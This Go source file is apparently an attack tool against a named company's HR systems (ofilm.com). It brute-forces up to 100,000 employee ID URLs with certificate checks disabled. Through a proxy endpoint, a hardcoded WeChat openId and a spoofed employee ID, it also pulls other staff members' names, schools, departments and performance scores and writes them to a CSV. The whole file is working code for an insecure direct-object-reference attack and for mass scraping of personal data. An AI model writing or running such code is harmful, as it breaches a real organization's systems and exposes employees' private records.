package algorithm

import (
	"bytes"
	"compress/gzip"
	"crypto/tls"
	"encoding/csv"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"path"
	"strconv"
	"sync"
)

// 最大并发数控制
const maxConcurrency = 50

// 请求函数
func fetchURL(wg *sync.WaitGroup, url string, sem chan struct{}, filename string) {
	defer wg.Done()

	// 控制并发数量
	sem <- struct{}{}
	defer func() { <-sem }()
	// Define the request body (empty JSON data)
	jsonData := []byte(`{}`)
	lastSegment := path.Base(url)
	filename_id := filename + "_id.txt"
	filename_body := filename + "_body.txt"
	// Create a new HTTP request
	req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonData))
	if err != nil {
		fmt.Println("Error creating request:", err)
	}

	// Set headers
	req.Header.Set("Host", "it.ofilm.com")
	req.Header.Set("Content-Type", "application/json")

	// Skip HTTPS certificate verification (insecure)
	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	resp, err := client.Do(req)
	if err != nil {
		fmt.Printf("[!] 请求失败: %s - %s\n", url, err)
		return
	}
	defer resp.Body.Close()

	// 检查状态码并处理响应
	body, _ := io.ReadAll(resp.Body)
	if resp.StatusCode == 200 && len(body) > 100 {
		fmt.Printf("[+] 有效 URL: %s\n", url)
		saveToFile(filename_id, lastSegment+"\n")
		saveToFile(filename_body, fmt.Sprintf("Response: %s\n", string(body)))
	}
}

// 将内容追加写入文件
func saveToFile(filename, data string) {
	file, err := os.OpenFile(filename, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("[!] 文件写入失败:", err)
		return
	}
	defer file.Close()

	if _, err := file.WriteString(data); err != nil {
		fmt.Println("[!] 写入文件错误:", err)
	}
}

func IworkGet() error {
	var wg sync.WaitGroup
	sem := make(chan struct{}, maxConcurrency) // 控制最大并发数

	// 扫描范围1: NF0000 - NF4000
	for i := 3260; i <= 3270; i++ {
		url := fmt.Sprintf("https://it.ofilm.com/hr/hr-ks/rest/kskinsfolk/kskinsfolk/findUserNoNcHrEK/NF%04d", i)
		wg.Add(1)
		filename := "NF0000-NF4000.txt"
		go fetchURL(&wg, url, sem, filename)
	}

	// 扫描范围2: N00000 - N99999
	for i := 0; i <= 99999; i++ {
		url := fmt.Sprintf("https://it.ofilm.com/hr/hr-ks/rest/kskinsfolk/kskinsfolk/findUserNoNcHrEK/N%05d", i)
		wg.Add(1)
		filename := "N00000-N99999.txt"
		go fetchURL(&wg, url, sem, filename)
	}

	wg.Wait() // 等待所有 goroutine 完成
	fmt.Println("[*] 扫描完成")
	return nil
}

func IworkSent(user string) error {

	// Define the request URL
	url := "https://it.ofilm.com/hr/hr-ks//rest/kskinsfolk/kskinsfolk/findUserNoNcHrEK/" + user

	// Define the request body (empty JSON data)
	jsonData := []byte(`{}`)

	// Create a new HTTP request
	req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonData))
	if err != nil {
		fmt.Println("Error creating request:", err)
		return nil
	}

	// Set headers
	req.Header.Set("Host", "it.ofilm.com")
	req.Header.Set("Content-Type", "application/json")

	// Skip HTTPS certificate verification (insecure)
	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}

	// Send the request
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("Error sending request:", err)
		return nil
	}
	defer resp.Body.Close()

	// Read the response body
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("Error reading response:", err)
		return nil
	}

	// Print the response status and body
	fmt.Printf("Status Code: %d\n", resp.StatusCode)
	fmt.Printf("Response Body: %s\n", body)
	return nil
}

type CheckReview struct {
	UserNo       string  `json:"userNo"`
	UserName     string  `json:"userName"`
	UserMaxEdu   string  `json:"userMaxEdu"`
	UserSchool   string  `json:"userSchool"`
	UserDept     string  `json:"userDept"`
	PerGrade     string  `json:"perGrade"`
	SrlScore     string  `json:"srlScore"`
	PerScore     float64 `json:"perScore"`
	FzqlScore    string  `json:"fzqlScore"`
	JcScore      float64 `json:"jcScore"`
	FzyyScore    string  `json:"fzyyScore"`
	FinalScore   float64 `json:"finalScore"`
	FinalGrade   string  `json:"finalGrade"`
	FinalRanking int     `json:"finalRanking"`
}

type ResultData struct {
	CheckReview CheckReview `json:"checkReview"`
}

type APIResponse struct {
	Result struct {
		Data []ResultData `json:"data"`
	} `json:"RESULT"`
}

func IworkRencai(name string) error {
	url := "https://bmxy.ofilm.com/rest/zf/zf/get"

	// 构造请求体 JSON，动态替换 empId 和 userNo
	jsonBody := fmt.Sprintf(`{
		"url": "https://info.ofilm.com/hr-dev-api/rest/api/hrti/selectSelfEvaluation",
		"empId": "NF3266",
		"openId": "olZaE61bCD9kOYCIJTKKfMeQxgsM",
		"data": {
			"userNo": "%s"
		}
	}`, name)

	// 创建 POST 请求
	req, err := http.NewRequest("POST", url, bytes.NewBuffer([]byte(jsonBody)))
	if err != nil {
		return fmt.Errorf("创建请求失败: %w", err)
	}

	// 设置完整请求头
	req.Header.Set("Content-Type", "application/json; charset=utf-8")
	req.Header.Set("Xweb_xhr", "1")
	req.Header.Set("Openid", "olZaE61bCD9kOYCIJTKKfMeQxgsM")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x63090a13) UnifiedPCWindowsWechat(0xf2540611) XWEB/14199")
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Sec-Fetch-Site", "cross-site")
	req.Header.Set("Sec-Fetch-Mode", "cors")
	req.Header.Set("Sec-Fetch-Dest", "empty")
	req.Header.Set("Referer", "https://servicewechat.com/wx7222634c083face7/211/page-frame.html")
	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
	req.Header.Set("Accept-Language", "zh-CN,zh;q=0.9")
	req.Header.Set("Priority", "u=1, i")
	req.Header.Set("Connection", "keep-alive")

	// 执行请求
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("请求失败: %w", err)
	}
	defer resp.Body.Close()

	var reader io.ReadCloser
	switch resp.Header.Get("Content-Encoding") {
	case "gzip":
		reader, err = gzip.NewReader(resp.Body)
		if err != nil {
			return fmt.Errorf("解压 GZIP 响应失败: %w", err)
		}
		defer reader.Close()
	default:
		reader = resp.Body
	}

	body, err := io.ReadAll(reader)
	if err != nil {
		return fmt.Errorf("读取响应失败: %w", err)
	}

	var apiResp APIResponse
	err = json.Unmarshal(body, &apiResp)
	if err != nil {
		panic(err)
	}

	if len(apiResp.Result.Data) > 0 {
		cr := apiResp.Result.Data[0].CheckReview
		fmt.Println("用户编号:", cr.UserNo)
		fmt.Println("姓名:", cr.UserName)
		fmt.Println("学历:", cr.UserMaxEdu)
		fmt.Println("学校:", cr.UserSchool)
		fmt.Println("部门:", cr.UserDept)
		fmt.Println("绩效等级:", cr.PerGrade)
		fmt.Println("能力评分:", cr.SrlScore)
		fmt.Println("绩效评分:", cr.PerScore)
		fmt.Println("潜力评分:", cr.FzqlScore)
		fmt.Println("奖惩评分:", cr.JcScore)
		fmt.Println("意愿评分:", cr.FzyyScore)
		fmt.Println("最终评分:", cr.FinalScore)
		fmt.Println("最终等级:", cr.FinalGrade)
		//fmt.Println("最终排名:", cr.FinalRanking)
		fmt.Println("-------------")

		// 写入 CSV（首次出现）
		csvPath := "output.csv"
		seen, err := loadExistingUserNos(csvPath)
		if err != nil {
			return fmt.Errorf("加载CSV失败: %w", err)
		}

		if !seen[cr.UserNo] {
			if err := writeUserToCSV(cr, csvPath); err != nil {
				return fmt.Errorf("写入CSV失败: %w", err)
			}
		}
	} else {
		fmt.Println("未找到相关数据")
	}

	return nil
}

func loadExistingUserNos(csvPath string) (map[string]bool, error) {
	seen := make(map[string]bool)

	file, err := os.Open(csvPath)
	if err != nil {
		if os.IsNotExist(err) {
			return seen, nil
		}
		return nil, err
	}
	defer file.Close()

	reader := csv.NewReader(file)
	for {
		record, err := reader.Read()
		if err == io.EOF {
			break
		}
		if err != nil {
			return nil, err
		}
		if len(record) > 0 {
			seen[record[0]] = true // UserNo
		}
	}
	return seen, nil
}

func writeUserToCSV(cr CheckReview, csvPath string) error {
	file, err := os.OpenFile(csvPath, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0644)
	if err != nil {
		return err
	}
	defer file.Close()

	writer := csv.NewWriter(file)
	defer writer.Flush()

	record := []string{
	cr.UserNo,
	cr.UserName,
	cr.UserMaxEdu,
	cr.UserSchool,
	cr.UserDept,
	cr.PerGrade,
	cr.SrlScore, // string 类型，直接用
	strconv.FormatFloat(cr.PerScore, 'f', -1, 64), // float64 类型，需转
	cr.FzqlScore, // string 类型，直接用
	strconv.FormatFloat(cr.JcScore, 'f', -1, 64),
	cr.FzyyScore, // string 类型，直接用
	strconv.FormatFloat(cr.FinalScore, 'f', -1, 64),
	cr.FinalGrade,
}

	return writer.Write(record)
}
